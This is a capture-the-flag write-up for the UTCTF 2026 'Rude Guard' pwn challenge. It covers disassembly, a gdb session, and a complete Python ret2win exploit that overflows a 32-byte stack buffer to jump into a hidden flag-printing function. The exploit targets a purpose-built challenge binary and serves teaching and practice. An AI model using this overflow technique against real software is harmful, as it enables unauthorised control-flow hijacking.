---
title: "Rude Guard - UTCTF 2026 write up"
date: 2026-03-17
categories: [CTF, Tournament]
tags: [UTCTF, pwn]
description: "No Description"
---

## Challenge Description
There's a guard that's protecting the flag! How do I sneak past him?

## Challenge Overview
The challenge provides a binary. As with other pwn challenges, the first step is to inspect the binary's metadata:
```bash
$ file pwnable
pwnable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ad855ad92ecf4b31fafab1c64895b7bc268895a5, for GNU/Linux 3.2.0, not stripped

$ checksec --file=pwnable
[*] '/home/kali/Desktop/wargame/guard/pwnable'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Trying to decompile the binary with IDA, we can find some special symbols and some suspicious interactive strings containing in it:

- `main()`:
    ```c
    int __fastcall main(int argc, const char **argv, const char **envp) {
        if ( argc == 1 )
        {
            puts("Are you not going to say hello?");
            return 0;
        }
        else
        {
            if ( atoi(argv[1]) == 1701604463 )
            {
                puts("Hi. What do you want.");
                read_input(0);
            }
            else
            {
                puts("Hi. Go away.");
            }
            return 0;
        }
    }
    ```

- `read_input()`:
    ```c
    __int64 __fastcall read_input(int a1) {
        char buf[32]; // [rsp+10h] [rbp-20h] BYREF

        read(a1, buf, 0x64u);
        if ( !strcmp(buf, "givemeflag\n") )
            puts("How rude! utflag{you're going to need a sneakier way in...}");
        else
            puts("I won't let you pass. No matter what.");
        return 0;
    }
    ```

- `secret_function()`:
    ```c
    __int64 secret_function() {
        _QWORD v1[3]; // [rsp+0h] [rbp-40h]
        _QWORD v2[3]; // [rsp+18h] [rbp-28h]
        int v3; // [rsp+34h] [rbp-Ch]
        char v4; // [rsp+3Bh] [rbp-5h]
        int i; // [rsp+3Ch] [rbp-4h]

        v4 = 50;
        v1[0] = 0x554955535E544647LL;
        v1[1] = 0x4106456D56400647LL;
        v1[2] = 0x6D4057590601456DLL;
        v2[0] = 0x466D5B6D5C065A46LL;
        *(_QWORD *)((char *)v2 + 7) = 0x4F465A5547025A46LL;
        v3 = 39;
        for ( i = 0; i < v3; ++i )
            putchar((unsigned __int8)v4 ^ *((_BYTE *)v1 + i));
        return 0;
    }
    ```

Examining these symbols leads to a few conclusions:
- An input-handling vulnerability appears in `read_input()`: the function allocates a 32-byte stack buffer but calls `read` with 0x64 (100) bytes. Because 100 &gt; 32, input can overflow `buf` and overwrite adjacent stack memory.
- `secret_function()` is not called by `main()`, so it appears to be a hidden path that an exploit could jump to.
- The attacker must pass an argument gate in `main()` before `read_input()` is invoked.

Since the overflow exists in `read_input()`, we hypothesize we can overwrite the saved RIP to redirect execution to `secret_function()`. The `secret_function()` decodes a byte array in a loop and prints each byte via `putchar`, so redirecting control there should reveal the flag.

Before proceeding, here's a concise summary of the binary's control flow:
1. Check `argc`.
2. If no extra argument: print “Are you not going to say hello?” and exit.
3. Else parse `argv[1]` via `atoi`.
4. Subtract constant `0x656c6c6f` (decimal 1701604463), which corresponds to the ASCII little-endian form of `"hello"`.
5. If result != 0: print “Hi. Go away.” and exit.
6. If result == 0: print “Hi. What do you want.” and call `read_input` with that zero value as first argument.
7. `read_input` reads attacker input and compares to `"givemeflag\n"`.
8. If equal: prints fake flag string.
9. Else: prints rejection message.
10. Return path is vulnerable due to stack overflow.

## Binary Analysis
First, find the addresses of the binary's symbols: `secret_function()` is at `0x40124f`. Because the binary is non-PIE, these addresses are fixed.
```bash
$ nm -n pwnable | egrep ' main$| read_input$| secret_function$| _start$'
0000000000401080 T _start
0000000000401166 T main
00000000004011ed T read_input
000000000040124f T secret_function
```

Next, try disassembly all symbols of this binary:
- `main()`:
    ```bash
    $ objdump -d -M intel pwnable | sed -n '/<main>:/,/^$/p'
    0000000000401166 <main>:
        401166:       55                      push   rbp
        401167:       48 89 e5                mov    rbp,rsp
        40116a:       48 83 ec 20             sub    rsp,0x20
        40116e:       89 7d ec                mov    DWORD PTR [rbp-0x14],edi
        401171:       48 89 75 e0             mov    QWORD PTR [rbp-0x20],rsi
        401175:       83 7d ec 01             cmp    DWORD PTR [rbp-0x14],0x1
        401179:       75 16                   jne    401191 <main+0x2b>
        40117b:       48 8d 05 86 0e 00 00    lea    rax,[rip+0xe86]        # 402008 <_IO_stdin_used+0x8>
        401182:       48 89 c7                mov    rdi,rax
        401185:       e8 b6 fe ff ff          call   401040 <puts@plt>
        40118a:       b8 00 00 00 00          mov    eax,0x0
        40118f:       eb 5a                   jmp    4011eb <main+0x85>
        401191:       48 8b 45 e0             mov    rax,QWORD PTR [rbp-0x20]
        401195:       48 83 c0 08             add    rax,0x8
        401199:       48 8b 00                mov    rax,QWORD PTR [rax]
        40119c:       48 89 c7                mov    rdi,rax
        40119f:       e8 cc fe ff ff          call   401070 <atoi@plt>
        4011a4:       2d 6f 6c 6c 65          sub    eax,0x656c6c6f
        4011a9:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
        4011ac:       83 7d fc 00             cmp    DWORD PTR [rbp-0x4],0x0
        4011b0:       74 16                   je     4011c8 <main+0x62>
        4011b2:       48 8d 05 6f 0e 00 00    lea    rax,[rip+0xe6f]        # 402028 <_IO_stdin_used+0x28>
        4011b9:       48 89 c7                mov    rdi,rax
        4011bc:       e8 7f fe ff ff          call   401040 <puts@plt>
        4011c1:       b8 00 00 00 00          mov    eax,0x0
        4011c6:       eb 23                   jmp    4011eb <main+0x85>
        4011c8:       48 8d 05 66 0e 00 00    lea    rax,[rip+0xe66]        # 402035 <_IO_stdin_used+0x35>
        4011cf:       48 89 c7                mov    rdi,rax
        4011d2:       e8 69 fe ff ff          call   401040 <puts@plt>
        4011d7:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
        4011da:       89 c7                   mov    edi,eax
        4011dc:       b8 00 00 00 00          mov    eax,0x0
        4011e1:       e8 07 00 00 00          call   4011ed <read_input>
        4011e6:       b8 00 00 00 00          mov    eax,0x0
        4011eb:       c9                      leave
        4011ec:       c3                      ret
    ```

    Notable points:
    ```asm
        401175: cmp DWORD PTR [rbp-0x14],0x1
        401179: jne 401191
        ...
        40119f: call atoi@plt
        4011a4: sub eax,0x656c6c6f
        4011ac: cmp DWORD PTR [rbp-0x4],0x0
        4011b0: je  4011c8
        ...
        4011e1: call 4011ed <read_input>
    ```

    Interpretation:
    - The gate is arithmetic: `atoi(argv[1]) == 0x656c6c6f`.
    - The decimal equivalent is `1701604463`.
    - Passing this gate reaches the vulnerable `read_input()`.

- `read_input()`:
    ```bash
    $ objdump -d -M intel pwnable | sed -n '/<read_input>:/,/^$/p'
    00000000004011ed <read_input>:
        4011ed:       55                      push   rbp
        4011ee:       48 89 e5                mov    rbp,rsp
        4011f1:       48 83 ec 30             sub    rsp,0x30
        4011f5:       89 7d dc                mov    DWORD PTR [rbp-0x24],edi
        4011f8:       48 8d 4d e0             lea    rcx,[rbp-0x20]
        4011fc:       8b 45 dc                mov    eax,DWORD PTR [rbp-0x24]
        4011ff:       ba 64 00 00 00          mov    edx,0x64
        401204:       48 89 ce                mov    rsi,rcx
        401207:       89 c7                   mov    edi,eax
        401209:       e8 42 fe ff ff          call   401050 <read@plt>
        40120e:       48 8d 45 e0             lea    rax,[rbp-0x20]
        401212:       48 8d 15 32 0e 00 00    lea    rdx,[rip+0xe32]        # 40204b <_IO_stdin_used+0x4b>
        401219:       48 89 d6                mov    rsi,rdx
        40121c:       48 89 c7                mov    rdi,rax
        40121f:       e8 3c fe ff ff          call   401060 <strcmp@plt>
        401224:       85 c0                   test   eax,eax
        401226:       75 11                   jne    401239 <read_input+0x4c>
        401228:       48 8d 05 29 0e 00 00    lea    rax,[rip+0xe29]        # 402058 <_IO_stdin_used+0x58>
        40122f:       48 89 c7                mov    rdi,rax
        401232:       e8 09 fe ff ff          call   401040 <puts@plt>
        401237:       eb 0f                   jmp    401248 <read_input+0x5b>
        401239:       48 8d 05 58 0e 00 00    lea    rax,[rip+0xe58]        # 402098 <_IO_stdin_used+0x98>
        401240:       48 89 c7                mov    rdi,rax
        401243:       e8 f8 fd ff ff          call   401040 <puts@plt>
        401248:       b8 00 00 00 00          mov    eax,0x0
        40124d:       c9                      leave
        40124e:       c3                      ret
    ```

    Notable points:
    ```asm
        4011f1: sub rsp,0x30
        4011f5: mov DWORD PTR [rbp-0x24],edi
        4011f8: lea rcx,[rbp-0x20]      ; buf starts at rbp-0x20 (32 bytes)
        ...
        4011ff: mov edx,0x64            ; nbytes = 100
        401209: call read@plt           ; read(fd, buf, 0x64)
        ...
        40121f: call strcmp@plt         ; strcmp(buf, "givemeflag\n")
        ...
        40124d: leave
        40124e: ret
    ```

    Based on the above:
    - The stack buffer at `[rbp-0x20]` is **32 bytes**.
    - `read` is called with size **100 bytes**.
    - The read can overflow the buffer and overwrite saved RBP and the saved RIP.

- `secret_function()`:
    ```bash
    $ objdump -d -M intel pwnable | sed -n '/<secret_function>:/,/^$/p'
    000000000040124f <secret_function>:
        40124f:       55                      push   rbp
        401250:       48 89 e5                mov    rbp,rsp
        401253:       48 83 ec 40             sub    rsp,0x40
        401257:       c6 45 fb 32             mov    BYTE PTR [rbp-0x5],0x32
        40125b:       48 b8 47 46 54 5e 53    movabs rax,0x554955535e544647
        401262:       55 49 55 
        401265:       48 ba 47 06 40 56 6d    movabs rdx,0x4106456d56400647
        40126c:       45 06 41 
        40126f:       48 89 45 c0             mov    QWORD PTR [rbp-0x40],rax
        401273:       48 89 55 c8             mov    QWORD PTR [rbp-0x38],rdx
        401277:       48 b8 6d 45 01 06 59    movabs rax,0x6d4057590601456d
        40127e:       57 40 6d 
        401281:       48 ba 46 5a 06 5c 6d    movabs rdx,0x466d5b6d5c065a46
        401288:       5b 6d 46 
        40128b:       48 89 45 d0             mov    QWORD PTR [rbp-0x30],rax
        40128f:       48 89 55 d8             mov    QWORD PTR [rbp-0x28],rdx
        401293:       48 b8 46 5a 02 47 55    movabs rax,0x4f465a5547025a46
        40129a:       5a 46 4f 
        40129d:       48 89 45 df             mov    QWORD PTR [rbp-0x21],rax
        4012a1:       c7 45 f4 27 00 00 00    mov    DWORD PTR [rbp-0xc],0x27
        4012a8:       c7 45 fc 00 00 00 00    mov    DWORD PTR [rbp-0x4],0x0
        4012af:       eb 1b                   jmp    4012cc <secret_function+0x7d>
        4012b1:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
        4012b4:       48 98                   cdqe
        4012b6:       0f b6 44 05 c0          movzx  eax,BYTE PTR [rbp+rax*1-0x40]
        4012bb:       32 45 fb                xor    al,BYTE PTR [rbp-0x5]
        4012be:       0f b6 c0                movzx  eax,al
        4012c1:       89 c7                   mov    edi,eax
        4012c3:       e8 68 fd ff ff          call   401030 <putchar@plt>
        4012c8:       83 45 fc 01             add    DWORD PTR [rbp-0x4],0x1
        4012cc:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
        4012cf:       3b 45 f4                cmp    eax,DWORD PTR [rbp-0xc]
        4012d2:       7c dd                   jl     4012b1 <secret_function+0x62>
        4012d4:       b8 00 00 00 00          mov    eax,0x0
        4012d9:       c9                      leave
        4012da:       c3                      ret
    ```

    Notable points:
    ```asm
        401257: mov BYTE PTR [rbp-0x5],0x32   ; XOR key
        ...
        4012b6: movzx eax,BYTE PTR [rbp+rax*1-0x40]
        4012bb: xor   al,BYTE PTR [rbp-0x5]
        4012c3: call  putchar@plt
        4012cf: cmp   eax,DWORD PTR [rbp-0xc] ; loop over 0x27 bytes
    ```

    Based on this, `secret_function()` writes a byte array to the stack, XORs each byte with the key `0x32`, and prints each decoded byte with `putchar`. The decoded output is the real flag.

Next, we perform dynamic analysis. First, generate a `payload.bin` to overflow the 32-byte buffer and overwrite the return address with `0x40124f`:
```python
import struct

payload=b'givemeflag\n\x00'+b'A'*(40-len(b'givemeflag\n\x00'))+struct.pack('<Q',0x40124f)
open('payload.bin','wb').write(payload)
print('len=',len(payload))
```

After creating `payload.bin`, we use gdb/pwndbg for dynamic analysis:
```bash
$ gdb -q ./pwnable                                                                                            

⚠️ warning: /home/kali/Desktop/pwndbg/gdbinit.py: No such file or directory
Reading symbols from ./pwnable...
(No debugging symbols found in ./pwnable)
(gdb) set pagination off
(gdb) b *0x40124e
Breakpoint 1 at 0x40124e
(gdb) run 1701604463 < payload.bin
Starting program: /home/kali/Desktop/wargame/guard/pwnable 1701604463 < payload.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Hi. What do you want.
How rude! utflag{you're going to need a sneakier way in...}

Breakpoint 1, 0x000000000040124e in read_input ()
(gdb) x/6gx $rbp-0x30
0x4141414141414111:     ❌️ Cannot access memory at address 0x4141414141414111
(gdb) x/gx $rbp+8
0x4141414141414149:     ❌️ Cannot access memory at address 0x4141414141414149
(gdb) info registers rip rbp rsp
rip            0x40124e            0x40124e <read_input+97>
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffd4e8      0x7fffffffd4e8
(gdb) ni
0x000000000040124f in secret_function ()
(gdb) info registers rip
rip            0x40124f            0x40124f <secret_function>
```

From the debugger output, these results are important:
```bash
Breakpoint 1, 0x000000000040124e in read_input ()
rip 0x40124e <read_input+97>
rbp 0x4141414141414141 ; --> payload worked
...
0x000000000040124f in secret_function ()
rip 0x40124f <secret_function> ; --> now executing secret_function.
```

This indicates:
- The saved frame pointer is overwritten by the payload.
- Single-stepping over the `ret` transfers execution into `secret_function()`.
- This is conclusive evidence of control-flow hijack.

Based on the analysis, we need to build a payload with an exact 40-byte offset to overwrite the saved RIP and set it to `0x40124f` (the address of `secret_function`).

## Exploit code
Here is the exploit code:
```python
#!/usr/bin/env python3
"""
Exploit for guard/pwnable

Root bug:
- Stack buffer overflow in read_input(): read(0, buf, 0x64) with buf size 0x20.
- Overwrite saved RIP and return into secret_function().
"""

import struct
import subprocess
from pathlib import Path

BINARY = Path(__file__).with_name("pwnable")

# Gate in main:
#   atoi(argv[1]) - 0x656c6c6f == 0
HELLO_MAGIC_DEC = str(0x656C6C6F)

# Function addresses from non-PIE binary
SECRET_FUNCTION = 0x40124F
OFFSET_TO_RIP = 40  # 0x20 buffer + 8 saved RBP + RIP at +0x28


def build_payload() -> bytes:
    """Build overflow payload that safely passes strcmp() first."""
    prefix = b"givemeflag\n\x00"
    padding = b"A" * (OFFSET_TO_RIP - len(prefix))
    return prefix + padding + struct.pack("<Q", SECRET_FUNCTION)


def main() -> None:
    payload = build_payload()

    # stdbuf -o0 ensures putchar() output is flushed before expected crash.
    proc = subprocess.run(
        ["stdbuf", "-o0", str(BINARY), HELLO_MAGIC_DEC],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )

    output = proc.stdout.decode("latin-1", errors="ignore")
    print(output)

    # Expected: process may crash after secret_function returns (invalid next RIP).
    print(f"[i] exit code: {proc.returncode}")


if __name__ == "__main__":
    main()
```

Result:
```bash
$ python3 solve.py  
Hi. What do you want.
How rude! utflag{you're going to need a sneakier way in...}
utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}
[i] exit code: -4
```

## Technical Summary
### Vulnerability Classification

- CWE-121: Stack-based Buffer Overflow
- Classic ret2win control-flow hijack due to unsafe `read` length.

### Techniques Used

- Static RE with symbol and disassembly mapping.
- Stack frame/offset reasoning from assembly.
- Runtime debugger validation of overwritten control flow.
- Payload engineering with exact RIP offset and static function address.